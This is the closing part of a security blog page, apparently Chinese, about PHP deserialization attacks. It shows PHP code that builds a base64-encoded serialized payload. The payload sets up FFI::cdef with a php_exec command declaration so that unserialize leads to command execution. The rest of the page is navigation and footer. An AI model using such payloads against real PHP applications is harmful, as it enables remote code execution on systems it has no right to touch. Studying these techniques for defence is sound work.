        <span class="token single-quoted-string string">'func'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token single-quoted-string string">'FFI::cdef'</span><span class="token punctuation">,</span>
        <span class="token single-quoted-string string">'arg'</span> <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token single-quoted-string string">'int php_exec(int type, char* command);'</span>
    <span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">data</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> string
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20201011154854.png" alt="image-20201011154842571"></p></div></div> <div class="page-edit"><!----> <div class="tags"><a href="/tags/?tag=PHP" title="标签">#PHP</a></div> <!----></div> <div class="page-nav-wapper"><div class="page-nav-centre-wrap"><a href="/pages/971e5d/" class="page-nav-centre page-nav-centre-prev"><div class="tooltip">利用phar文件拓展php反序列化攻击</div></a> <a href="/pages/20ac5e/" class="page-nav-centre page-nav-centre-next"><div class="tooltip">Python-Pickle反序列化安全问题</div></a></div> <div class="page-nav"><p class="inner"><span class="prev">
        ←
        <a href="/pages/971e5d/" class="prev">利用phar文件拓展php反序列化攻击</a></span> <span class="next"><a href="/pages/20ac5e/">Python-Pickle反序列化安全问题</a>→
      </span></p></div></div></div> <div class="article-list"><div class="article-title"><a href="/archives/" class="iconfont icon-bi">最近更新</a></div> <div class="article-wrapper"><dl><dd>01</dd> <dt><a href="/pages/152581/"><div>RMI与JNDI（一）</div></a> <span>01-29</span></dt></dl><dl><dd>02</dd> <dt><a href="/pages/fae557/"><div>Java8-Stream</div></a> <span>01-03</span></dt></dl><dl><dd>03</dd> <dt><a href="/pages/5d070a/"><div>谈一谈Java动态加载字节码的方式</div></a> <span>12-18</span></dt></dl> <dl><dd></dd> <dt><a href="/archives/" class="more">更多文章&gt;</a></dt></dl></div></div> </main></div> <div class="footer"><div class="icons"></div> 
  Theme by
  <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" title="本站主题">Vdoing</a> 
    | Copyright © 2019-2021
    <span></span></div> <div class="buttons"><div title="返回顶部" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="去评论" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="主题模式" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">跟随系统</li><li class="iconfont icon-rijianmoshi">浅色模式</li><li class="iconfont icon-yejianmoshi">深色模式</li><li class="iconfont icon-yuedu">阅读模式</li></ul></div></div> <!----></div><div class="global-ui"><div></div></div></div>
    <script src="/assets/js/app.23243609.js" defer></script><script src="/assets/js/2.b6b5fde6.js" defer></script><script src="/assets/js/12.f76d046e.js" defer></script>
  </body>
</html>